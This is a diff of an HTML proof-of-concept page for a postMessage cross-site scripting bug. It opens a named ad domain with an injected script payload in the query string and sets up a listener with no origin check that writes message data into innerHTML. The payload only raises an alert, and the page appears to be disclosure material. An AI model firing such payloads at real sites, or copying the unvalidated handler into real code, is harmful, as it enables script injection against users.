@@ -4,20 +4,29 @@
     <title>PoC: PostMessage XSS via RealizePerformance</title>
   </head>
   <body>
-    <h2>Malicious Parent</h2>
-    <iframe src="https://ads.realizeperformance.com/anypage?x=<script>alert('XSS')</script>"
-            width="0" height="0" style="display:none" id="evilFrame">
-    </iframe>
+    <h2>PoC: RealizePerformance PostMessage XSS</h2>
+
+    <button onclick="runExploit()">Run Exploit</button>
 
     <script>
-      // Vulnerable message handler (simulating what a real site might do)
-      window.addEventListener("message", function(event) {
-        // ❌ NO origin validation
-        if (event.data && typeof event.data === "object" && event.data.value) {
-          // ❌ Injects location.href directly into the DOM => XSS
-          document.body.innerHTML += "<h3>Injected URL:</h3>" + event.data.value;
-        }
-      });
+      function runExploit() {
+        // Open the vulnerable site in a new window
+        const win = window.open(
+          "https://ads.realizeperformance.com/?x=<script>alert('XSS')</script>", 
+          "exploitWindow", 
+          "width=400,height=400"
+        );
+
+        // Setup message listener
+        window.addEventListener("message", function(event) {
+          console.log("Received message:", event.data);
+
+          // Dangerous behavior (simulate injection vulnerability)
+          if (event.data && typeof event.data.value === "string") {
+            document.body.innerHTML += "<p>Injected: " + event.data.value + "</p>";
+          }
+        }, false);
+      }
     </script>
   </body>
 </html>
